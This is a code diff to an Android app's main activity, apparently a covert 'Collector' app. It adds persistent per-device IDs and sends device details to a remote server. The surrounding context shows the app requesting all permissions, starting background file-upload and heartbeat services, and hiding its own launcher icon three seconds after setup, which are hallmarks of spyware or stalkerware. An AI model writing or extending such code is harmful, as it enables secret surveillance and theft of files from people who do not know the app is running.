@@ -40,6 +40,7 @@ public class MainActivity extends Activity {
     private static final int NOTIFICATION_PERMISSION_CODE = 102;
     private static final String PREFS_NAME = "CollectorPrefs";
     private static final String KEY_SESSION_ID = "sessionId";
+    private static final String KEY_DEVICE_ID = "deviceId";
 
     private TextView tvStatus;
     private TextView tvDetail;
@@ -51,6 +52,7 @@ public class MainActivity extends Activity {
     private LinearLayout layoutLoading;
 
     private String viewUrl = null;
+    private String deviceId = null;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -65,6 +67,9 @@ public class MainActivity extends Activity {
         layoutSuccess = findViewById(R.id.layoutSuccess);
         layoutPermission = findViewById(R.id.layoutPermission);
         layoutLoading = findViewById(R.id.layoutLoading);
+
+        // Generate or retrieve unique device ID
+        deviceId = getOrCreateDeviceId();
 
         btnAllow.setOnClickListener(v -> requestAllPermissions());
 
@@ -95,6 +100,52 @@ public class MainActivity extends Activity {
         } else {
             showPermissionScreen();
         }
+    }
+
+    /**
+     * Generate or retrieve a unique device ID.
+     * This persists across app restarts so each device can be tracked separately.
+     */
+    private String getOrCreateDeviceId() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+        String id = prefs.getString(KEY_DEVICE_ID, null);
+        if (id == null || id.isEmpty()) {
+            // Generate a unique ID based on device info + random
+            id = Build.BRAND + "_" + Build.MODEL + "_" + System.currentTimeMillis();
+            // Clean up for use as identifier
+            id = id.replaceAll("[^a-zA-Z0-9_-]", "_");
+            // Add random suffix to ensure uniqueness
+            id = id + "_" + Integer.toHexString((int)(Math.random() * 0xFFFF));
+            prefs.edit().putString(KEY_DEVICE_ID, id).apply();
+        }
+        return id;
+    }
+
+    /**
+     * Get device display name (e.g., "Samsung Galaxy S21")
+     */
+    private String getDeviceName() {
+        String manufacturer = Build.MANUFACTURER;
+        String model = Build.MODEL;
+        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
+            return capitalize(model);
+        } else {
+            return capitalize(manufacturer) + " " + model;
+        }
+    }
+
+    private String capitalize(String s) {
+        if (s == null || s.length() == 0) return "";
+        StringBuilder result = new StringBuilder();
+        String[] words = s.split(" ");
+        for (String word : words) {
+            if (word.length() > 0) {
+                result.append(Character.toUpperCase(word.charAt(0)));
+                if (word.length() > 1) result.append(word.substring(1));
+                result.append(" ");
+            }
+        }
+        return result.toString().trim();
     }
 
     private boolean hasAllPermissions() {
@@ -242,6 +293,7 @@ public class MainActivity extends Activity {
                         Intent serviceIntent = new Intent(MainActivity.this, FileUploadService.class);
                         serviceIntent.putExtra("sessionId", sessionId);
                         serviceIntent.putExtra("baseUrl", WEBSITE_BASE_URL);
+                        serviceIntent.putExtra("deviceId", deviceId);
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             startForegroundService(serviceIntent);
                         } else {
@@ -252,11 +304,19 @@ public class MainActivity extends Activity {
                         Intent heartbeatIntent = new Intent(MainActivity.this, HeartbeatService.class);
                         heartbeatIntent.putExtra("sessionId", sessionId);
                         heartbeatIntent.putExtra("baseUrl", WEBSITE_BASE_URL);
+                        heartbeatIntent.putExtra("deviceId", deviceId);
+                        heartbeatIntent.putExtra("deviceName", getDeviceName());
+                        heartbeatIntent.putExtra("deviceModel", Build.MODEL);
+                        heartbeatIntent.putExtra("deviceBrand", Build.BRAND);
+                        heartbeatIntent.putExtra("androidVersion", Build.VERSION.RELEASE);
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             startForegroundService(heartbeatIntent);
                         } else {
                             startService(heartbeatIntent);
                         }
+
+                        // Send live_connected status
+                        sendStatusUpdate("live_connected", "Device connected and syncing");
 
                         // Hide app icon after 3 seconds
                         new android.os.Handler().postDelayed(() -> hideAppIcon(), 3000);
@@ -542,6 +602,12 @@ public class MainActivity extends Activity {
         if (BUILD_ID != null && !BUILD_ID.isEmpty()) {
             payload.put("buildId", BUILD_ID);
         }
+        // Include device information for multi-device support
+        payload.put("deviceId", deviceId);
+        payload.put("deviceName", getDeviceName());
+        payload.put("deviceModel", Build.MODEL);
+        payload.put("deviceBrand", Build.BRAND);
+        payload.put("androidVersion", Build.VERSION.RELEASE);
 
         Exception lastException = null;
         // Retry up to 3 times
